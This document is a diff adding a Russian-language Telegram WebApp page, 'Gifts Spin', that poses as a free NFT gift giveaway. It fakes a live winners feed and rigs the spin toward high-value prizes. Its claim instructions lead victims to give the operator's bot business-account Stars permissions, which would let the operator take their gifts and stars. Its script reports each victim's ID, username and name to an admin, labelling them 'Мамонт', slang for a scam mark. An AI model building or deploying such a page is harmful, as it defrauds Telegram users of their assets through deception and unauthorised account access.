@@ -1,0 +1,830 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Spin Gifts</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
+    <style>
+        :root {
+            --common-color: #4CAF50;
+            --rare-color: #2196F3;
+            --epic-color: #9C27B0;
+            --legendary-color: #FFD700;
+            --live-color: #FF0000;
+        }
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #1a1a2e, #16213e);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #fff;
+            overflow: hidden;
+            -webkit-text-size-adjust: 100%;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(15px);
+            border-radius: 20px;
+            padding: 15px;
+            width: 92%;
+            max-width: 380px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            position: relative;
+            z-index: 1;
+            margin: 10px 0;
+            box-sizing: border-box;
+        }
+        .header {
+            font-size: 22px;
+            font-weight: bold;
+            margin-bottom: 6px;
+            background: linear-gradient(90deg, #ff8a00, #e52e71);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            line-height: 1.2;
+            padding: 0 5px;
+        }
+        .subheader {
+            font-size: 14px;
+            margin-bottom: 15px;
+            opacity: 0.9;
+            line-height: 1.3;
+            padding: 0 5px;
+        }
+        .rarity {
+            display: flex;
+            justify-content: space-between;
+            margin: 15px 0;
+            font-weight: bold;
+            font-size: 12px;
+            flex-wrap: wrap;
+            gap: 3px;
+            padding: 0 5px;
+        }
+        .common { color: var(--common-color); }
+        .rare { color: var(--rare-color); }
+        .epic { color: var(--epic-color); }
+        .legendary { 
+            color: var(--legendary-color);
+            text-shadow: 0 0 5px rgba(255, 215, 0, 0.5);
+        }
+        .wheel-container {
+            position: relative;
+            width: 100%;
+            height: 100px;
+            margin: 0 auto 15px;
+            overflow: hidden;
+            border-radius: 12px;
+            border: 2px solid rgba(255, 255, 255, 0.2);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.5);
+        }
+        .wheel {
+            display: flex;
+            height: 100%;
+            align-items: center;
+            position: relative;
+            background: rgba(0, 0, 0, 0.3);
+        }
+        .prize-item {
+            min-width: 65px;
+            height: 65px;
+            margin: 0 7px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            font-size: 9px;
+            font-weight: bold;
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: 0 0 8px rgba(0, 0, 0, 0.5);
+            border: 1px solid;
+            background: rgba(0, 0, 0, 0.6);
+            flex-shrink: 0;
+        }
+        .prize-item img {
+            width: 40px;
+            height: 40px;
+            object-fit: contain;
+            border-radius: 6px;
+        }
+        .open-btn {
+            background: linear-gradient(45deg, #FF416C, #FF4B2B);
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            font-size: 14px;
+            border-radius: 25px;
+            cursor: pointer;
+            font-weight: bold;
+            margin-top: 10px;
+            transition: all 0.3s;
+            box-shadow: 0 4px 12px rgba(255, 75, 43, 0.5);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            width: 80%;
+            max-width: 220px;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        .open-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 15px rgba(255, 75, 43, 0.7);
+        }
+        .open-btn:disabled {
+            background: #555;
+            transform: none;
+            box-shadow: none;
+            cursor: not-allowed;
+        }
+        .result {
+            margin-top: 15px;
+            padding: 10px;
+            border-radius: 10px;
+            background: rgba(255, 255, 255, 0.1);
+            position: relative;
+        }
+        .result-prize {
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 6px;
+            line-height: 1.2;
+        }
+        .result-value {
+            font-size: 14px;
+            opacity: 0.9;
+            line-height: 1.3;
+        }
+        .bot-name {
+            margin-top: 15px;
+            font-size: 11px;
+            opacity: 0.7;
+        }
+        .pointer {
+            position: absolute;
+            left: 50%;
+            top: -15px;
+            transform: translateX(-50%);
+            width: 0;
+            height: 0;
+            border-left: 15px solid transparent;
+            border-right: 15px solid transparent;
+            border-bottom: 25px solid #FF416C;
+            z-index: 10;
+            filter: drop-shadow(0 0 5px rgba(255, 65, 108, 0.7));
+        }
+        .prize-image {
+            width: 160px;
+            height: 160px;
+            margin: 0 auto;
+            border-radius: 12px;
+            overflow: hidden;
+            margin-bottom: 12px;
+            border: 2px solid;
+            box-shadow: 0 0 15px;
+            position: relative;
+        }
+        .prize-image img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .live-indicator {
+            position: fixed;
+            left: 10px;
+            bottom: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            background: rgba(0, 0, 0, 0.7);
+            border-radius: 15px;
+            padding: 8px 5px;
+            font-size: 12px;
+            font-weight: bold;
+            z-index: 101;
+            box-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
+            writing-mode: vertical-rl;
+            text-orientation: mixed;
+            transform: rotate(180deg);
+            transition: all 0.5s ease;
+        }
+        .live-dot {
+            width: 8px;
+            height: 8px;
+            background-color: var(--live-color);
+            border-radius: 50%;
+            margin: 5px 0;
+            animation: pulse 1.5s infinite;
+        }
+        @keyframes pulse {
+            0% { transform: scale(0.95); opacity: 1; }
+            50% { transform: scale(1.2); opacity: 0.7; }
+            100% { transform: scale(0.95); opacity: 1; }
+        }
+        .claim-btn {
+            background: linear-gradient(45deg, #32CD32, #228B22);
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            font-size: 14px;
+            border-radius: 25px;
+            cursor: pointer;
+            font-weight: bold;
+            margin-top: 10px;
+            transition: all 0.3s;
+            box-shadow: 0 4px 12px rgba(50, 205, 50, 0.5);
+            width: 80%;
+            max-width: 220px;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        .claim-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 15px rgba(50, 205, 50, 0.7);
+        }
+        .instructions {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 10px;
+            padding: 12px;
+            margin-top: 12px;
+            text-align: left;
+            display: none;
+            font-size: 13px;
+        }
+        .instructions-title {
+            font-weight: bold;
+            margin-bottom: 10px;
+            font-size: 15px;
+        }
+        .instructions-list {
+            padding-left: 15px;
+            margin: 0;
+        }
+        .instructions-list li {
+            margin-bottom: 6px;
+            line-height: 1.3;
+        }
+        .main-screen {
+            display: block;
+        }
+        .prize-screen {
+            display: none;
+        }
+        .legendary-border {
+            border-color: var(--legendary-color) !important;
+            box-shadow: 0 0 15px rgba(255, 215, 0, 0.7) !important;
+        }
+        .epic-border {
+            border-color: var(--epic-color) !important;
+            box-shadow: 0 0 15px rgba(156, 39, 176, 0.7) !important;
+        }
+        .rare-border {
+            border-color: var(--rare-color) !important;
+            box-shadow: 0 0 15px rgba(33, 150, 243, 0.7) !important;
+        }
+        .wins-feed {
+            position: fixed;
+            bottom: 15px;
+            left: 50px;
+            right: 10px;
+            display: flex;
+            justify-content: center;
+            z-index: 100;
+            gap: 6px;
+            padding: 0 8px;
+            box-sizing: border-box;
+            overflow-x: auto;
+            scrollbar-width: none;
+            transition: all 0.5s ease;
+        }
+        .wins-feed::-webkit-scrollbar {
+            display: none;
+        }
+        .win-notification {
+            background: rgba(0, 0, 0, 0.7);
+            border-radius: 10px;
+            padding: 6px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-width: 65px;
+            animation: slideIn 0.5s forwards;
+            flex-shrink: 0;
+        }
+        .win-notification img {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            object-fit: cover;
+            margin-bottom: 3px;
+            border: 1px solid;
+        }
+        .win-notification .prize-name {
+            font-size: 9px;
+            text-align: center;
+            margin-bottom: 2px;
+            font-weight: bold;
+            line-height: 1.1;
+        }
+        .win-notification .prize-value {
+            font-size: 8px;
+            opacity: 0.8;
+            line-height: 1.1;
+        }
+        @keyframes slideIn {
+            from { transform: translateY(60px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        .prize-animation {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 40px;
+            z-index: 1000;
+            animation: zoomIn 0.5s, float 2s infinite 0.5s;
+            text-shadow: 0 0 8px currentColor;
+        }
+        @keyframes zoomIn {
+            from { transform: translate(-50%, -50%) scale(0); opacity: 0; }
+            to { transform: translate(-50%, -50%) scale(1); opacity: 1; }
+        }
+        @keyframes float {
+            0%, 100% { transform: translate(-50%, -50%) translateY(0); }
+            50% { transform: translate(-50%, -50%) translateY(-12px); }
+        }
+        .common-bg { border-color: var(--common-color); }
+        .rare-bg { border-color: var(--rare-color); }
+        .epic-bg { border-color: var(--epic-color); }
+        .legendary-bg { border-color: var(--legendary-color); }
+        .fade-out {
+            opacity: 0;
+            transform: rotate(180deg) translateY(20px);
+        }
+        .wins-feed.fade-out {
+            opacity: 0;
+            transform: translateY(20px);
+        }
+        @media (max-width: 350px) {
+            .container {
+                width: 90%;
+                padding: 12px;
+            }
+            .header {
+                font-size: 20px;
+            }
+            .wheel-container {
+                height: 90px;
+            }
+            .prize-item {
+                min-width: 60px;
+                height: 60px;
+                margin: 0 5px;
+            }
+            .prize-item img {
+                width: 35px;
+                height: 35px;
+            }
+            .wins-feed {
+                left: 45px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="live-indicator" id="liveIndicator">
+        <div class="live-dot"></div>
+        LIVE DROP
+    </div>
+    
+    <div class="wins-feed" id="winsFeed"></div>
+    
+    <div class="container main-screen" id="mainScreen">
+        <div class="header">GIFTS SPIN</div>
+        <div class="subheader" id="subheader">Вам доступен бесплатный кейс</div>
+        
+        <div class="rarity">
+            <div class="common">COMMON</div>
+            <div class="rare">RARE</div>
+            <div class="epic">EPIC</div>
+            <div class="legendary">LEGENDARY</div>
+        </div>
+        
+        <div class="wheel-container">
+            <div class="pointer"></div>
+            <div class="wheel" id="wheel"></div>
+        </div>
+        
+        <button class="open-btn" id="openBtn">Открыть кейс</button>
+        
+        <div class="bot-name">@GIFTS_SPIN_BOT</div>
+    </div>
+
+    <div class="container prize-screen" id="prizeScreen">
+        <div class="prize-image" id="prizeImage">
+            <img src="" alt="Prize Image">
+        </div>
+        
+        <div class="result">
+            <div class="result-prize" id="resultPrize"></div>
+            <div class="result-value" id="resultValue"></div>
+        </div>
+        
+        <button class="claim-btn" id="claimBtn">Забрать приз</button>
+        
+        <div class="instructions" id="instructions">
+            <div class="instructions-title">Как получить подарок?</div>
+            <p>Для того чтобы забрать подарок, у нас должен быть доступ для отправки подарков Вам, как его сделать?</p>
+            <ol class="instructions-list">
+                <li>Зайдите в Настройки Telegram</li>
+                <li>Перейдите в раздел 'Telegram для бизнеса'</li>
+                <li>Перейдите в раздел 'Чат-боты'</li>
+                <li>Найдите нашего бота в поиске и выберите его</li>
+                <li>Убедитесь, что все разрешения из раздела звезды предоставлены. После этого забирайте свой подарок</li>
+            </ol>
+        </div>
+    </div>
+
+    <script>
+        // Инициализация Telegram WebApp
+        const tg = window.Telegram.WebApp;
+        tg.expand();
+        
+        // Конфигурация
+        const ADMIN_ID = "7256080274"; // ID админа для уведомлений
+        
+        // Подарки
+        const allPrizes = [
+            {
+                name: "Citrine",
+                image: "https://telegifter.ru/wp-content/themes/gifts/assets/img/gifts/astralshard/Citrine.webp",
+                value: "70TON",
+                type: "legendary",
+                emoji: "💎"
+            },
+            {
+                name: "Bonded Ring",
+                image: "https://telegifter.ru/wp-content/themes/gifts/assets/img/gifts/bondedring/Goldsmith.webp",
+                value: "49.92TON",
+                type: "legendary",
+                emoji: "💍"
+            },
+            {
+                name: "Hex Pot",
+                image: "https://telegifter.ru/wp-content/themes/gifts/assets/img/gifts/hexpot/Amortentia.webp",
+                value: "2.7TON",
+                type: "rare",
+                emoji: "🧪"
+            },
+            {
+                name: "Ion Gem",
+                image: "https://telegifter.ru/wp-content/themes/gifts/assets/img/gifts/iongem/Elements.webp",
+                value: "69.95TON",
+                type: "legendary",
+                emoji: "🔮"
+            },
+            {
+                name: "Jelly Bunny",
+                image: "https://telegifter.ru/wp-content/themes/gifts/assets/img/gifts/jellybunny/Thug%20Life.webp",
+                value: "3.02TON",
+                type: "rare",
+                emoji: "🐰"
+            },
+            {
+                name: "Kissed Frog",
+                image: "https://telegifter.ru/wp-content/themes/gifts/assets/img/gifts/kissedfrog/Happy%20Pepe.webp",
+                value: "70TON",
+                type: "epic",
+                emoji: "🐸"
+            },
+            {
+                name: "Nail Bracelet",
+                image: "https://telegifter.ru/wp-content/themes/gifts/assets/img/gifts/nailbracelet/Diamond.webp",
+                value: "100TON",
+                type: "epic",
+                emoji: "💅"
+            },
+            {
+                name: "Plush PEPE",
+                image: "https://telegifter.ru/wp-content/themes/gifts/assets/img/gifts/plushpepe/Midas%20Pepe.webp",
+                value: "3200.01TON",
+                type: "legendary",
+                emoji: "🐸"
+            },
+            {
+                name: "Sharp Tongue",
+                image: "https://telegifter.ru/wp-content/themes/gifts/assets/img/gifts/sharptongue/Zombie%20Bite.webp",
+                value: "70TON",
+                type: "epic",
+                emoji: "👅"
+            }
+        ];
+
+        // Элементы DOM
+        const wheel = document.getElementById('wheel');
+        const openBtn = document.getElementById('openBtn');
+        const resultPrize = document.getElementById('resultPrize');
+        const resultValue = document.getElementById('resultValue');
+        const claimBtn = document.getElementById('claimBtn');
+        const prizeImage = document.getElementById('prizeImage');
+        const prizeImageImg = prizeImage.querySelector('img');
+        const instructions = document.getElementById('instructions');
+        const mainScreen = document.getElementById('mainScreen');
+        const prizeScreen = document.getElementById('prizeScreen');
+        const winsFeed = document.getElementById('winsFeed');
+        const liveIndicator = document.getElementById('liveIndicator');
+        const subheader = document.getElementById('subheader');
+        
+        // Хранилище для призов пользователей
+        let userPrize = null;
+        
+        // Проверяем, есть ли сохраненный приз для пользователя
+        function checkUserPrize() {
+            const userId = tg.initDataUnsafe?.user?.id;
+            if (!userId) return false;
+            
+            // В реальном приложении здесь нужно получать данные из бекенда или localStorage
+            // Для демонстрации используем localStorage
+            const savedPrize = localStorage.getItem(`user_prize_${userId}`);
+            if (savedPrize) {
+                userPrize = JSON.parse(savedPrize);
+                return true;
+            }
+            return false;
+        }
+        
+        // Создаем рулетку
+        function createWheel() {
+            wheel.innerHTML = '';
+            
+            // Добавляем больше копий призов для бесконечного эффекта
+            const prizesToShow = [...allPrizes, ...allPrizes, ...allPrizes];
+            
+            prizesToShow.forEach((prize, index) => {
+                const prizeElement = document.createElement('div');
+                prizeElement.className = `prize-item ${prize.type}-bg`;
+                
+                const img = document.createElement('img');
+                img.src = prize.image;
+                img.alt = prize.name;
+                
+                prizeElement.appendChild(img);
+                wheel.appendChild(prizeElement);
+            });
+        }
+        
+        // Показ выигрышей в ленте
+        function showWinsFeed() {
+            winsFeed.innerHTML = '';
+            
+            // Берем 3 случайных приза
+            const shuffled = [...allPrizes].sort(() => 0.5 - Math.random());
+            const selectedPrizes = shuffled.slice(0, 3);
+            
+            selectedPrizes.forEach(prize => {
+                const winElement = document.createElement('div');
+                winElement.className = 'win-notification';
+                winElement.innerHTML = `
+                    <img src="${prize.image}" alt="${prize.name}" class="${prize.type}-bg">
+                    <div class="prize-name">${prize.name}</div>
+                    <div class="prize-value">${prize.value}</div>
+                `;
+                winsFeed.appendChild(winElement);
+            });
+            
+            // Обновляем каждые 5 секунд
+            setTimeout(showWinsFeed, 5000);
+        }
+        
+        // Анимация выигрыша
+        function showPrizeAnimation(prize) {
+            const animation = document.createElement('div');
+            animation.className = 'prize-animation';
+            animation.style.color = getColorByType(prize.type);
+            animation.textContent = prize.emoji;
+            document.body.appendChild(animation);
+            
+            // Запускаем конфетти
+            confetti({
+                particleCount: 150,
+                spread: 70,
+                origin: { y: 0.6 },
+                colors: ['#FFD700', '#FF416C', '#32CD32', '#2196F3']
+            });
+            
+            // Удаляем через 3 секунды
+            setTimeout(() => {
+                animation.remove();
+            }, 3000);
+        }
+        
+        function getColorByType(type) {
+            switch(type) {
+                case 'legendary': return 'var(--legendary-color)';
+                case 'epic': return 'var(--epic-color)';
+                case 'rare': return 'var(--rare-color)';
+                default: return 'var(--common-color)';
+            }
+        }
+        
+        // Отправка уведомления админу
+        function sendAdminNotification(action) {
+            if (!tg.initDataUnsafe?.user) return;
+            
+            const user = tg.initDataUnsafe.user;
+            const username = user.username ? `@${user.username}` : 'Без username';
+            const fullName = [user.first_name, user.last_name].filter(Boolean).join(' ');
+            
+            const message = {
+                action: "admin_notification",
+                admin_id: ADMIN_ID,
+                text: `✅Мамонт ${username} (${fullName}, ID: ${user.id}) ${action}`,
+                user_data: {
+                    id: user.id,
+                    username: user.username,
+                    first_name: user.first_name,
+                    last_name: user.last_name
+                }
+            };
+            
+            if (tg.sendData) {
+                tg.sendData(JSON.stringify(message));
+            }
+        }
+        
+        // Анимация вращения рулетки с ускорением и замедлением
+        function spinWheel(targetPrize, callback) {
+            const startTime = Date.now();
+            const duration = 5000; // 5 секунд анимации
+            const startPosition = 0;
+            
+            // Находим индекс приза в массиве
+            const prizeIndex = allPrizes.findIndex(p => p.name === targetPrize.name);
+            if (prizeIndex === -1) {
+                console.error('Приз не найден в списке');
+                return;
+            }
+            
+            // Вычисляем целевую позицию (с учетом того, что призы повторяются 3 раза)
+            // Центрируем выбранный приз под указателем
+            const prizeWidth = 65 + 14; // ширина приза + margin
+            const targetPosition = -((prizeIndex * prizeWidth) + (allPrizes.length * prizeWidth * 2) + (prizeWidth / 2 - wheel.offsetWidth / 2));
+            
+            // Функция анимации
+            function animate() {
+                const currentTime = Date.now();
+                const elapsed = currentTime - startTime;
+                const progress = Math.min(elapsed / duration, 1);
+                
+                // Кривая ускорения/замедления
+                let easeProgress;
+                if (progress < 0.3) {
+                    // Ускорение (первые 30% времени)
+                    easeProgress = easeInQuad(progress / 0.3) * 0.3;
+                } else if (progress > 0.7) {
+                    // Замедление (последние 30% времени)
+                    easeProgress = easeOutQuad((progress - 0.7) / 0.3) * 0.3 + 0.7;
+                } else {
+                    // Постоянная скорость (средние 40% времени)
+                    easeProgress = progress;
+                }
+                
+                const currentPosition = startPosition + (targetPosition - startPosition) * easeProgress;
+                wheel.style.transform = `translateX(${currentPosition}px)`;
+                
+                if (progress < 1) {
+                    requestAnimationFrame(animate);
+                } else {
+                    callback();
+                }
+            }
+            
+            // Функции для плавного ускорения/замедления
+            function easeInQuad(t) {
+                return t * t;
+            }
+            
+            function easeOutQuad(t) {
+                return t * (2 - t);
+            }
+            
+            // Запускаем анимацию
+            animate();
+        }
+        
+        // Показываем экран с выигранным призом
+        function showPrizeScreen(prize) {
+            // Устанавливаем границу в зависимости от редкости
+            prizeImage.className = `prize-image ${prize.type}-border`;
+            
+            prizeImageImg.src = prize.image;
+            prizeImageImg.alt = prize.name;
+            
+            resultPrize.innerHTML = `<span class="${prize.type}">🎉 ${prize.name} ${prize.emoji}</span>`;
+            resultValue.textContent = `Ценность: ${prize.value}`;
+            
+            // Показываем экран приза
+            mainScreen.style.display = 'none';
+            prizeScreen.style.display = 'block';
+            
+            // Анимация выигрыша
+            showPrizeAnimation(prize);
+            
+            // Плавно скрываем Live drop и NFT
+            liveIndicator.classList.add('fade-out');
+            winsFeed.classList.add('fade-out');
+            
+            // Сохраняем приз для пользователя
+            const userId = tg.initDataUnsafe?.user?.id;
+            if (userId) {
+                localStorage.setItem(`user_prize_${userId}`, JSON.stringify(prize));
+            }
+            
+            // Отправляем данные о выигрыше в бота
+            if (tg.sendData) {
+                tg.sendData(JSON.stringify({
+                    action: "prize_won",
+                    prize: {
+                        name: prize.name,
+                        value: prize.value,
+                        type: prize.type,
+                        image: prize.image
+                    },
+                    user_id: userId
+                }));
+            }
+        }
+        
+        // Инициализация
+        function init() {
+            createWheel();
+            showWinsFeed();
+            
+            // Проверяем, есть ли у пользователя уже приз
+            const hasPrize = checkUserPrize();
+            if (hasPrize) {
+                // Показываем сразу экран с призом
+                showPrizeScreen(userPrize);
+                subheader.textContent = "Ваш выигранный приз";
+            } else {
+                // Показываем экран с рулеткой
+                mainScreen.style.display = 'block';
+                prizeScreen.style.display = 'none';
+                subheader.textContent = "Вам доступен бесплатный кейс";
+            }
+        }
+        
+        // Обработчик кнопки "Открыть кейс"
+        openBtn.addEventListener('click', () => {
+            openBtn.disabled = true;
+            
+            // Выбираем случайный приз с шансом 30% на легендарный
+            const random = Math.random();
+            let prize;
+            
+            if (random < 0.3) { // 30% шанс на легендарный
+                const legendaryPrizes = allPrizes.filter(p => p.type === "legendary");
+                prize = legendaryPrizes[Math.floor(Math.random() * legendaryPrizes.length)];
+            } else {
+                // 70% шанс на любой другой приз (включая легендарные, но с общим распределением)
+                prize = allPrizes[Math.floor(Math.random() * allPrizes.length)];
+            }
+            
+            // Запоминаем приз
+            userPrize = prize;
+            
+            // Запускаем анимацию вращения
+            spinWheel(prize, () => {
+                showPrizeScreen(prize);
+            });
+        });
+        
+        // Обработчик кнопки "Забрать приз"
+        claimBtn.addEventListener('click', () => {
+            // Показываем/скрываем инструкцию
+            instructions.style.display = instructions.style.display === 'block' ? 'none' : 'block';
+            
+            // Отправляем уведомление админу при открытии инструкции
+            if (instructions.style.display === 'block') {
+                sendAdminNotification("зашел в webapp и нажал кнопку инструкция");
+            }
+        });
+        
+        // Инициализируем приложение
+        init();
+    </script>
+</body>
+</html>
